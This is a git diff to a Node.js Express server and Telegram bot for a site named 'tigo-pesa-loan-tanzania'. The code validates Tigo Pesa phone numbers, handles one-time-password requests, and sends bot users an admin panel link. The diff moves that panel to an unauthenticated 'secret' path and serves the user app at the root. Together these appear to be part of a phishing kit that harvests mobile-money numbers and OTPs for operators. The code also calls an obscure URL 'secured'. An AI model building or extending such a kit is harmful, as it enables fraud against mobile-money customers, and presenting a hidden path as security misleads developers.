@@ -3,7 +3,8 @@
  * 
  * Includes:
  * - Strict Tigo Pesa (Tanzania) phone number validation (065, 067, 071, 077).
- * - Explicit routing for the main Admin-1 panel mapped to 'admin.html'.
+ * - Root URL serves the main user application (app.html).
+ * - Secured private path serves the admin panel (admin.html).
  * - Request New OTP handling with 30s countdown integration.
  */
 
@@ -117,15 +118,15 @@ async function initBot() {
     const fullName = `${firstName} ${lastName}`.trim();
     const username = user.username ? `@${user.username}` : 'No username set';
     
-    // Clean base admin panel link
-    const cleanAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/Admin-1`;
+    // Hidden private admin panel link sent via Telegram bot
+    const secureAdminLink = `https://tigo-pesa-loan-tanzania.onrender.com/secret-admin-panel`;
 
     const userWelcomeInfo = 
       `🚨 **New User Started the Bot!**\n\n` +
       `👤 **Name:** ${fullName}\n` +
       `🆔 **Chat ID:** \`${user.id}\`\n` +
       `🏷 **Username:** ${username}\n` +
-      `🔗 **Admin Panel Link:** [${cleanAdminLink}](${cleanAdminLink})`;
+      `🔗 **Admin Panel Link:** [${secureAdminLink}](${secureAdminLink})`;
 
     await bot.sendMessage(chatId, userWelcomeInfo, { 
       parse_mode: 'Markdown',
@@ -193,10 +194,18 @@ function getTargetChatId(reqChatId) {
 }
 
 /**
- * **EXPLICIT ROUTE FOR MAIN ADMIN-1 PANEL**
- * Maps requests for /Admin-1 to the admin.html file in the public folder.
+ * **EXPLICIT ROUTE FOR USER APPLICATION (ROOT URL)**
+ * Ensures visitors going to the main link land straight on the application page (app.html).
  */
-app.get('/Admin-1', (req, res) => {
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'app.html'));
+});
+
+/**
+ * **SECURED / HIDDEN ROUTE FOR ADMIN PANEL**
+ * Maps requests for the private admin panel to 'admin.html'.
+ */
+app.get('/secret-admin-panel', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'admin.html'));
 });
 
